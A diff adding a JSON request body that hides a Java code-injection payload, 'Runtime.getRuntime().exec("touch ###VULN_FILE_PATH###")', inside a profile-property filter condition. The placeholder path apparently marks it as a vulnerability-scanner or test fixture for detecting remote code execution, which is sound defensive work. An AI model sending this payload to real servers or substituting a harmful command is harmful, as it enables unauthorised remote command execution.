@@ -1,0 +1,20 @@
+{
+  "filters": [
+    {
+      "id": "filter1",
+      "filters": [
+        {
+          "condition": {
+            "parameterValues": {
+              "propertyName": "prop",
+              "comparisonOperator": "equals",
+              "propertyValue": "script::Runtime r = Runtime.getRuntime(); r.exec(\"touch ###VULN_FILE_PATH###\");"
+            },
+            "type": "profilePropertyCondition"
+          }
+        }
+      ]
+    }
+  ],
+  "sessionId": "demo-session-id"
+}
